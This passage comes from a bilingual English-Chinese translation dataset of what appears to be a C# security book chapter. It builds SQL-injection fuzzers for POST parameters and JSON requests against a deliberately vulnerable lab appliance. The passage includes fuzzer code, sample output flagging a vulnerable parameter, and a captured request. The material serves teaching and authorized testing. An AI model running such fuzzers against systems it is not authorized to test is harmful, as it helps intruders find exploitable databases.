    cartitem 参数，因为它们是服务器将解释的参数。
- en: The Fuzzing Begins
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 模糊测试开始
- en: Before we start fuzzing our POST request parameters, we need to set up a little
    bit of data, as shown in [Listing 2-17](#filepos156934).
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们开始模糊测试 POST 请求参数之前，我们需要设置一些数据，如 [清单 2-17](#filepos156934) 所示。
- en: public static void Main(string[] args)
  id: totrans-209
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public static void Main(string[] args)
- en: '{'
  id: totrans-210
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: string[] requestLines = ➊File.ReadAllLines(args[0]);
  id: totrans-211
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string[] requestLines = ➊File.ReadAllLines(args[0]);
- en: ➋string[] parms = requestLines[requestLines.Length - 1].Split('&');
  id: totrans-212
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➋string[] parms = requestLines[requestLines.Length - 1].Split('&');
- en: ➌string host = string.Empty;
  id: totrans-213
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➌string host = string.Empty;
- en: StringBuilder requestBuilder = new ➍StringBuilder();
  id: totrans-214
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: StringBuilder requestBuilder = new ➍StringBuilder();
- en: ''
  id: totrans-215
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: foreach (string ln in requestLines)
  id: totrans-216
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: foreach (string ln in requestLines)
- en: '{'
  id: totrans-217
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: if (ln.StartsWith("Host:"))
  id: totrans-218
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (ln.StartsWith("Host:"))
- en: host = ln.Split(' ')[1].➎Replace("\r", string.Empty);
  id: totrans-219
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: host = ln.Split(' ')[1].➎Replace("\r", string.Empty);
- en: requestBuilder.Append(ln + "\n");
  id: totrans-220
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: requestBuilder.Append(ln + "\n");
- en: '}'
  id: totrans-221
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-222
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string request = requestBuilder.ToString() + "\r\n";
  id: totrans-223
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string request = requestBuilder.ToString() + "\r\n";
- en: Console.WriteLine(request);
  id: totrans-224
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine(request);
- en: '}'
  id: totrans-225
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 2-17: The  Main()  method reading a POST request and storing the  Host  header'
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 清单 2-17：Main() 方法读取 POST 请求并存储 Host 头
- en: We read the request from the file using File.ReadAllLines() ➊ and pass the first
    argument to the fuzzing application as the argument to ReadAllLines(). We use
    ReadAllLines() instead of ReadAllText() because we need to split the request in
    order to get information out of it (namely, the Host header) before fuzzing. After
    reading the request line by line into a string array and grabbing the parameters
    from the last line of the file ➋, we declare two variables. The host variable
    ➌ stores the IP address of the host we are sending the request to. Declared below
    is a System.Text.StringBuilder ➍, which we’ll use to build the full request as
    a single string.
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用 File.ReadAllLines() ➊ 从文件中读取请求，并将第一个参数传递给模糊测试应用程序，作为 ReadAllLines() 的参数。我们使用
    ReadAllLines() 而不是 ReadAllText()，因为我们需要拆分请求以提取信息（即 Host 头），然后再进行模糊测试。在按行读取请求并将其存储到字符串数组中后，我们从文件的最后一行获取参数
    ➋，然后声明两个变量。host 变量 ➌ 存储我们正在发送请求的主机的 IP 地址。接下来声明一个 System.Text.StringBuilder ➍，我们将使用它来构建完整的请求，作为一个单独的字符串。
- en: NOTE
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: We use a StringBuilder because it’s more performant than using the += operator
    with a basic string type (each time you call the += operator, you create a new
    string object in memory). On a small file like this, you won’t notice a difference,
    but when you’re dealing with a lot of strings in memory, you will. Using a StringBuilder
    creates only one object in memory, resulting in much less memory overhead.
  id: totrans-229
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 我们使用 StringBuilder，因为它比使用 += 操作符与基本字符串类型更高效（每次调用 += 操作符时，会在内存中创建一个新的字符串对象）。在处理这样的小文件时，你不会注意到差别，但当你处理大量字符串时，你就会发现。使用
    StringBuilder 只会在内存中创建一个对象，从而大大减少内存开销。
- en: Now we loop through each line in the request that was previously read in. We
    check whether the line begins with "Host:" and, if so, assign the second half
    of the host string to the host variable. (This should be an IP address.) We then
    call Replace() ➎ on the string to remove the trailing \r, which could be left
    by some versions of Mono, since an IP address does not have \r in it. Finally,
    we append the line with \r\n to the StringBuilder. Having built the full request,
    we assign it to a new string variable called request. (For HTTP, your request
    must end with \r\n; otherwise, the server response will hang.)
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们遍历先前读取的请求中的每一行。我们检查该行是否以 "Host:" 开头，如果是，就将主机字符串的第二部分分配给 host 变量。（这应该是一个
    IP 地址。）然后我们调用 Replace() ➎ 方法，从字符串中删除尾部的 \r，这是某些 Mono 版本可能留下的，因为 IP 地址本身没有 \r。最后，我们将该行与
    \r\n 一起附加到 StringBuilder 中。构建完整的请求后，我们将其分配给一个名为 request 的新字符串变量。（对于 HTTP，请求必须以
    \r\n 结尾；否则，服务器响应将会挂起。）
- en: Fuzzing Parameters
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: 模糊测试参数
- en: Now that we have the full request to send, we need to loop through and attempt
    to fuzz the parameters for SQL injections. Within this loop, we’ll use the classes
    System.Net.Sockets.Socket and System.Net.IPEndPoint. Because we have the full
    HTTP request as a string, we can use a basic socket to communicate with the server
    instead of relying on the HTTP libraries to create the request for us. Now we
    have all that we need to fuzz the server, as shown in [Listing 2-18](#filepos161898).
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们有了完整的请求，可以开始遍历并尝试对参数进行 SQL 注入模糊测试。在这个循环中，我们将使用类 System.Net.Sockets.Socket
    和 System.Net.IPEndPoint。因为我们已经有了完整的 HTTP 请求字符串，所以我们可以使用一个基本的 socket 与服务器通信，而不依赖
    HTTP 库来为我们创建请求。现在我们拥有了进行服务器模糊测试所需的一切，如 [示例 2-18](#filepos161898) 中所示。
- en: IPEndPoint rhost = ➊new IPEndPoint(IPAddress.Parse(host), 80);
  id: totrans-233
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: IPEndPoint rhost = ➊new IPEndPoint(IPAddress.Parse(host), 80);
- en: foreach (string parm in parms)
  id: totrans-234
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: foreach (string parm in parms)
- en: '{'
  id: totrans-235
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: using (Socket sock = new ➋Socket(AddressFamily.InterNetwork,
  id: totrans-236
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 (Socket sock = new ➋Socket(AddressFamily.InterNetwork,
- en: SocketType.Stream, ProtocolType.Tcp))
  id: totrans-237
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SocketType.Stream, ProtocolType.Tcp))
- en: '{'
  id: totrans-238
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: sock.➌Connect (rhost);
  id: totrans-239
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: sock.➌Connect (rhost);
- en: ''
  id: totrans-240
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string val = parm.➍Split('=')[1];
  id: totrans-241
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string val = parm.➍Split('=')[1];
- en: string req = request.➎Replace("=" + val, "=" + val + "'");
  id: totrans-242
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string req = request.➎Replace("=" + val, "=" + val + "'");
- en: ''
  id: totrans-243
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: byte[] reqBytes = ➏Encoding.ASCII.GetBytes(req);
  id: totrans-244
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: byte[] reqBytes = ➏Encoding.ASCII.GetBytes(req);
- en: sock.➐Send(reqBytes);
  id: totrans-245
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: sock.➐Send(reqBytes);
- en: ''
  id: totrans-246
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: byte[] buf = new byte[sock.ReceiveBufferSize];
  id: totrans-247
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: byte[] buf = new byte[sock.ReceiveBufferSize];
- en: ''
  id: totrans-248
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: sock.➑Receive(buf);
  id: totrans-249
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: sock.➑Receive(buf);
- en: string response = ➒Encoding.ASCII.GetString(buf);
  id: totrans-250
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string response = ➒Encoding.ASCII.GetString(buf);
- en: if (response.Contains("error in your SQL syntax"))
  id: totrans-251
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 如果（response.Contains("SQL语法错误")）
- en: Console.WriteLine("Parameter " + parm + " seems vulnerable");
  id: totrans-252
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine("参数 " + parm + " 似乎存在漏洞");
- en: 'Console.Write(" to SQL injection with value: " + val + "''");'
  id: totrans-253
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.Write(" 用于SQL注入，值为：" + val + "'");
- en: '}'
  id: totrans-254
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-255
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 2-18: Additional code added to  Main()  method fuzzing the POST parameters'
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 2-18：向 Main() 方法中添加了用于模糊测试 POST 参数的额外代码
- en: In [Listing 2-18](#filepos161898), we create a new IPEndPoint object ➊ by passing
    a new IPAddress object returned by IPAddress.Parse(host) and the port we will
    be connecting to on the IP address (80). Now we can loop over the parameters grabbed
    from the requestLines variable previously. For each iteration, we need to create
    a new Socket connection ➋ to the server, and we use the AddressFamily.InterNetwork
    to tell the socket it is IPv4 (version 4 of the Internet Protocol, as opposed
    to IPv6) and use SocketType.Stream to tell the socket that this is a streaming
    socket (stateful, two-way, and reliable). We also use ProtocolType.Tcp to tell
    the socket that the protocol to be used is TCP.
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: 在[示例 2-18](#filepos161898)中，我们通过传递由 IPAddress.Parse(host) 返回的一个新的 IPAddress
    对象和我们将要连接的 IP 地址上的端口（80）来创建一个新的 IPEndPoint 对象 ➊。现在我们可以遍历之前从 requestLines 变量中获取的参数。对于每次迭代，我们需要创建一个新的
    Socket 连接 ➋ 到服务器，并使用 AddressFamily.InterNetwork 告诉 socket 它是 IPv4（即互联网协议的第4版，而不是
    IPv6），并使用 SocketType.Stream 告诉 socket 这是一个流式 socket（有状态、双向、可靠）。我们还使用 ProtocolType.Tcp
    告诉 socket 使用 TCP 协议。
- en: Once this object is instantiated, we can call Connect() ➌ on it by passing our
    IPEndPoint object rhost as an argument. After we have connected to the remote
    host on port 80, we can begin fuzzing the parameter. We split the parameter from
    the foreach loop on the equal sign (=) character ➍ and extract the value of that
    parameter using the value in the second index of the array (resulting from the
    method call). Then we call Replace() ➎ on the request string to replace the original
    value with a tainted one. For example, if our value is 'foo' within the parameters
    string 'blah=foo&blergh=bar', we would replace foo with foo' (note the apostrophe
    appended to the end of foo).
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦实例化了这个对象，我们可以通过传递我们的 IPEndPoint 对象 rhost 作为参数来调用 Connect() ➌。连接到远程主机的 80 端口后，我们可以开始模糊测试该参数。我们从
    foreach 循环中通过等号（=）字符 ➍拆分参数，并使用数组的第二个索引值（来自方法调用的结果）提取该参数的值。然后我们在请求字符串上调用 Replace()
    ➎，将原始值替换为被污染的值。例如，如果我们的值是 'foo'，在参数字符串 'blah=foo&blergh=bar' 中，我们会将 foo 替换为 foo'（注意加在
    foo 末尾的撇号）。
- en: Next, we get a byte array representing the string using Encoding.ASCII.GetBytes()
    ➏, and we send it over the socket ➐ to the server port specified in the IPEndPoint
    constructor. This is equivalent to making a request from your web browser to the
    URL in the address bar.
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们使用 Encoding.ASCII.GetBytes() ➏ 将字符串转换为字节数组，并通过 socket ➐ 将其发送到 IPEndPoint
    构造函数中指定的服务器端口。这相当于从您的网页浏览器向地址栏中的 URL 发出请求。
- en: After sending the request, we create a byte array equal to the size of the response
    we will receive, and we fill it with the response from the server with Receive()
    ➑. We use Encoding.ASCII.GetString() ➒ to get the string that the byte array represents,
    and we can then parse the response from the server. We check the response from
    the server by checking whether the SQL error message we expect is in the response
    data.
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 在发送请求后，我们创建一个与我们将接收到的响应大小相等的字节数组，并使用Receive() ➑将服务器的响应填充到该数组中。我们使用Encoding.ASCII.GetString()
    ➒来获取字节数组所表示的字符串，然后可以解析服务器的响应。我们通过检查响应数据中是否包含预期的SQL错误信息来验证服务器的响应。
- en: Our fuzzer should output any parameters that result in SQL errors, as shown
    in [Listing 2-19](#filepos165521).
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的模糊测试工具应该输出所有导致SQL错误的参数，如[清单 2-19](#filepos165521)所示。
- en: $ mono POST_fuzzer.exe /tmp/request
  id: totrans-262
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ mono POST_fuzzer.exe /tmp/request
- en: 'Parameter cartitem=1000 seems vulnerable to SQL injection with value: 1000'''
  id: totrans-263
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 参数cartitem=1000似乎容易受到SQL注入攻击，值为：1000'
- en: 'Parameter cartitem=1003 seems vulnerable to SQL injection with value: 1003'''
  id: totrans-264
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 参数cartitem=1003似乎容易受到SQL注入攻击，值为：1003'
- en: $
  id: totrans-265
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $
- en: 'Listing 2-19: Output from running the POST fuzzer on the request'
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 清单 2-19：运行POST模糊测试工具后的输出
- en: As we can see in the fuzzer output, the cartitem HTTP parameter seems vulnerable
    to a SQL injection. When we insert an apostrophe into the current value of the
    HTTP parameter, we get back a SQL error in the HTTP response, which makes this
    highly likely to be vulnerable to a SQL injection attacks.
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们在模糊测试工具的输出中看到的，cartitem HTTP参数似乎容易受到SQL注入攻击。当我们在当前的HTTP参数值中插入单引号时，我们会在HTTP响应中得到一个SQL错误，这使得它很可能容易受到SQL注入攻击。
- en: Fuzzing JSON
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: 模糊测试JSON
- en: As a pentester or security engineer, you will likely run into web services that
    accept data serialized as JavaScript Object Notation (JSON) in some form as input.
    In order to help you learn to fuzz JSON HTTP requests, I’ve written a small web
    application called CsharpVulnJson that accepts JSON and uses the information within
    to persist and search user-related data. A small virtual appliance has been created
    so that the web service works out of the box; it is available on the VulnHub website
    ([http://www.vulnhub.com/](http://www.vulnhub.com/)).
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: 作为渗透测试人员或安全工程师，你可能会遇到接受某种形式的JavaScript对象表示法（JSON）数据的Web服务。为了帮助你学习如何模糊测试JSON
    HTTP请求，我编写了一个名为CsharpVulnJson的小型Web应用程序，它接受JSON并使用其中的信息来持久化和搜索与用户相关的数据。为了方便使用，已经创建了一个小型虚拟设备，使得Web服务开箱即用；它可以在VulnHub网站上找到（[http://www.vulnhub.com/](http://www.vulnhub.com/)）。
- en: Setting Up the Vulnerable Appliance
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: 设置易受攻击的设备
- en: CsharpVulnJson ships as an OVA file, a completely self-contained virtual machine
    archive that you can simply import into your choice of virtualization suite. In
    most cases, double-clicking the OVA file should bring up your virtualization software
    to automatically import the appliance.
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: CsharpVulnJson以OVA文件格式提供，这是一个完全自包含的虚拟机档案，你可以直接将其导入你选择的虚拟化软件中。在大多数情况下，双击OVA文件应该会启动虚拟化软件，并自动导入该设备。
- en: Capturing a Vulnerable JSON Request
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: 捕获易受攻击的JSON请求
- en: Once CsharpVulnJson is running, point Firefox to port 80 on the virtual machine,
    and you should see a user management interface like the one shown in [Figure 2-7](#filepos168102).
    We will focus on creating users with the Create User button and the HTTP request
    this button makes when creating a user.
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦CsharpVulnJson运行，打开Firefox并指向虚拟机的80端口，你应该会看到一个类似于[图 2-7](#filepos168102)所示的用户管理界面。我们将专注于使用创建用户按钮创建用户以及该按钮在创建用户时发送的HTTP请求。
- en: Assuming Firefox is still set up to pass through Burp Suite as an HTTP proxy,
    fill in the Create a user fields and click Create User to yield an HTTP request
    with the user information inside a JSON hash in Burp Suite’s request pane, as
    in [Listing 2-20](#filepos169465).
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: 假设Firefox仍然设置为通过Burp Suite作为HTTP代理，填写创建用户字段并点击创建用户按钮，这将生成一个包含用户信息的JSON哈希的HTTP请求，该请求出现在Burp
    Suite的请求窗格中，如[清单 2-20](#filepos169465)所示。
- en: '![](images/00018.jpg)'
  id: totrans-275
  prefs: []
  type: TYPE_IMG
  zh: '![](images/00018.jpg)'
- en: 'Figure 2-7: The CsharpVulnJson web application open in Firefox'
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: 图 2-7：在Firefox中打开的CsharpVulnJson Web应用程序
- en: POST /Vulnerable.ashx HTTP/1.1
  id: totrans-277
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: POST /Vulnerable.ashx HTTP/1.1
- en: 'Host: 192.168.1.56'
  id: totrans-278
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Host: 192.168.1.56'
- en: 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:26.0) Gecko/20100101
    Firefox/26.0'
  id: totrans-279
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:26.0) Gecko/20100101
    Firefox/26.0'
- en: 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
  id: totrans-280
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
- en: 'Accept-Language: en-US,en;q=0.5'
  id: totrans-281
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Accept-Language: en-US,en;q=0.5'
- en: 'Accept-Encoding: gzip, deflate'
  id: totrans-282
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Accept-Encoding: gzip, deflate'
- en: 'Content-Type: application/json; charset=UTF-8'
  id: totrans-283
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Content-Type: application/json; charset=UTF-8'
- en: 'Referer: http://192.168.1.56/'
  id: totrans-284
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Referer: http://192.168.1.56/'
- en: 'Content-Length: 190'
  id: totrans-285
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Content-Length: 190'
- en: 'Cookie: ASP.NET_SessionId=5D14CBC0D339F3F054674D8B'
  id: totrans-286
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Cookie: ASP.NET_SessionId=5D14CBC0D339F3F054674D8B'
- en: 'Connection: keep-alive'
  id: totrans-287
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Connection: keep-alive'
- en: 'Pragma: no-cache'
  id: totrans-288
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Pragma: no-cache'
- en: 'Cache-Control: no-cache'
  id: totrans-289
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Cache-Control: no-cache'
- en: ''
  id: totrans-290
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{"username":"whatthebobby","password":"propane1","age":42,"line1":"123 Main
    St",'
  id: totrans-291
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{"username":"whatthebobby","password":"propane1","age":42,"line1":"123 Main
    St",'
- en: '"line2":"","city":"Arlen","state":"TX","zip":78727,"first":"Hank","middle":"","last":"Hill",'
  id: totrans-292
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '"line2":"","city":"Arlen","state":"TX","zip":78727,"first":"Hank","middle":"","last":"Hill",'
- en: '"method":"create"}'
  id: totrans-293
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '"method":"create"}'
- en: 'Listing 2-20: Create User request with JSON containing user information to
    save to the database'
  id: totrans-294
  prefs: []
  type: TYPE_NORMAL
  zh: 示例2-20：创建包含用户信息的JSON请求，将数据保存到数据库
- en: Now right-click the request pane and select Copy to File. When asked where to
    save the HTTP request on your computer, make your choice and note where the request
    was saved, because you’ll need to pass the path to the fuzzer.
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: 现在右键单击请求窗格并选择复制到文件。当系统询问要将HTTP请求保存到计算机的哪里时，选择保存路径并记下保存位置，因为你需要将该路径传递给模糊器。
- en: Creating the JSON Fuzzer
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: 创建JSON模糊器
- en: In order to fuzz this HTTP request, we need to separate the JSON from the rest
    of the request. We then need to iterate over each key/value pair in the JSON and
    alter the value to try to induce any SQL errors from the web server.
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: 为了模糊化这个HTTP请求，我们需要将JSON与请求的其他部分分离。然后，我们需要遍历JSON中的每个键值对，并修改其值，以尝试从Web服务器诱发任何SQL错误。
- en: Reading the Request File
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: 阅读请求文件
- en: To create the JSON HTTP request fuzzer, we start with a known-good HTTP request
    (the Create User request). Using the previously saved HTTP request, we can read
    in the request and begin the fuzzing process, as shown in [Listing 2-21](#filepos171570).
  id: totrans-299
  prefs: []
  type: TYPE_NORMAL
  zh: 为了创建JSON HTTP请求模糊器，我们从一个已知有效的HTTP请求（创建用户请求）开始。通过使用之前保存的HTTP请求，我们可以读取请求并开始模糊化过程，如[示例2-21](#filepos171570)所示。
- en: public static void Main(string[] args)
  id: totrans-300
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public static void Main(string[] args)
- en: '{'
  id: totrans-301
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: string url = ➊args[0];
  id: totrans-302
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string url = ➊args[0];
- en: string requestFile = ➋args[1];
  id: totrans-303
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string requestFile = ➋args[1];
- en: string[] request = null;
  id: totrans-304
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string[] request = null;
- en: ''
  id: totrans-305
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: using (StreamReader rdr = ➌new StreamReader(File.➍OpenRead(requestFile)))
  id: totrans-306
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: using (StreamReader rdr = ➌new StreamReader(File.➍OpenRead(requestFile)))
- en: request = rdr.➎ReadToEnd().➏Split('\n');
  id: totrans-307
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: request = rdr.➎ReadToEnd().➏Split('\n');
- en: ''
  id: totrans-308
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string json = ➐request[request.Length - 1];
  id: totrans-309
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string json = ➐request[request.Length - 1];
- en: JObject obj = ➑JObject.Parse(json);
  id: totrans-310
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: JObject obj = ➑JObject.Parse(json);
- en: ''
  id: totrans-311
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Console.WriteLine("Fuzzing POST requests to URL " + url);
  id: totrans-312
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine("正在对URL " + url 进行POST请求模糊化");
- en: ➒IterateAndFuzz(url, obj);
  id: totrans-313
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➒IterateAndFuzz(url, obj);
- en: '}'
  id: totrans-314
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 2-21: The  Main  method, which kicks off fuzzing the JSON parameter'
  id: totrans-315
  prefs: []
  type: TYPE_NORMAL
  zh: 示例2-21：Main方法，启动JSON参数的模糊化过程
- en: The first thing we do is store the first ➊ and second ➋ arguments passed to
    the fuzzer in two variables (url and requestFile, respectively). We also declare
    a string array that will be assigned the data in our HTTP request after reading
    the request from the filesystem.
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: 我们做的第一件事是将传递给模糊器的第一个➊和第二个➋参数存储到两个变量中（分别是url和requestFile）。我们还声明一个字符串数组，该数组将在从文件系统读取请求后，赋值为HTTP请求中的数据。
- en: Within the context of a using statement, we open our request file for reading
    using File.OpenRead() ➍ and pass the file stream returned to the StreamReader
    constructor ➌. With the new StreamReader class instantiated, we can read all the
    data in the file with the ReadToEnd() method ➎. We also split the data in the
    request file using the Split() method ➏, passing a newline character to the method
    as the character to split the request up. The HTTP protocol dictates that newlines
    (carriage returns and line feeds, specifically) be used to separate the headers
    from the data being sent in the request. The string array returned by Split()
    is assigned to the request variable we declared earlier.
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: 在using语句的上下文中，我们使用File.OpenRead() ➋打开请求文件以供读取，并将返回的文件流传递给StreamReader构造函数 ➌。通过实例化新的StreamReader类，我们可以使用ReadToEnd()方法
    ➎读取文件中的所有数据。然后，我们使用Split()方法 ➏对请求文件中的数据进行拆分，并传递换行符作为拆分请求的字符。HTTP协议规定，换行符（具体来说是回车符和换行符）用于将头信息与请求中发送的数据分开。Split()方法返回的字符串数组将赋值给我们之前声明的request变量。
- en: Having read and split the request file, we can grab the JSON data we need to
    fuzz and begin iterating through the JSON key/value pairs to find SQL injection
    vectors. The JSON we want is the last line of the HTTP request, which is the last
    element in the request array. Because 0 is the first element in an array, we subtract
    1 from the request array length, use the resulting integer to grab the last element
    in the request array, and assign the value to the string json ➐.
  id: totrans-318
  prefs: []
  type: TYPE_NORMAL
  zh: 在读取并拆分请求文件后，我们可以抓取需要进行模糊测试的 JSON 数据，并开始遍历 JSON 键值对以寻找 SQL 注入漏洞。我们想要的 JSON 是
    HTTP 请求的最后一行，即请求数组中的最后一个元素。由于 0 是数组中的第一个元素，我们通过从请求数组长度中减去 1 来获取请求数组的最后一个元素，并将其值赋给字符串
    json ➐。
- en: Once we have the JSON separated from the HTTP request, we can parse the json
    string and create a JObject that we can programmatically iterate on using JObject.Parse()
    ➑. The JObject class is available in the Json.NET library, freely available via
    the NuGet package manager or at [http://www.newtonsoft.com/json/](http://www.newtonsoft.com/json/).
    We will use this library throughout the book.
  id: totrans-319
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们将 JSON 从 HTTP 请求中分离出来，我们就可以解析 json 字符串，并创建一个 JObject，使用 JObject.Parse()
    ➑ 以便进行编程遍历。JObject 类可以在 Json.NET 库中找到，该库可以通过 NuGet 包管理器或访问 [http://www.newtonsoft.com/json/](http://www.newtonsoft.com/json/)
    免费获取。我们将在全书中使用这个库。
- en: After creating the new JObject, we print a status line to inform the user we
    are fuzzing POST requests to the given URL. Finally, we pass the JObject and the
    URL to make HTTP POST requests to the IterateAndFuzz() method ➒ to process the
    JSON and fuzz the web application.
  id: totrans-320
  prefs: []
  type: TYPE_NORMAL
  zh: 创建新 JObject 后，我们打印一行状态信息，通知用户我们正在向给定的 URL 发送 POST 请求进行模糊测试。最后，我们将 JObject 和
    URL 传递给 IterateAndFuzz() 方法 ➒，以处理 JSON 并对 Web 应用程序进行模糊测试。
- en: Iterating Over the JSON Keys and Values
  id: totrans-321
  prefs: []
  type: TYPE_NORMAL
  zh: 遍历 JSON 键值对
- en: Now we can start iterating over each JSON key/value pair and set each pair up
    to test for a possible SQL injection vector. [Listing 2-22](#filepos176273) shows
    how to accomplish this using the IterateAndFuzz() method.
  id: totrans-322
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以开始遍历每个 JSON 键值对，并设置每一对以测试是否存在 SQL 注入漏洞。[列表 2-22](#filepos176273) 展示了如何使用
    IterateAndFuzz() 方法来实现这一点。
- en: private static void IterateAndFuzz(string url, JObject obj)
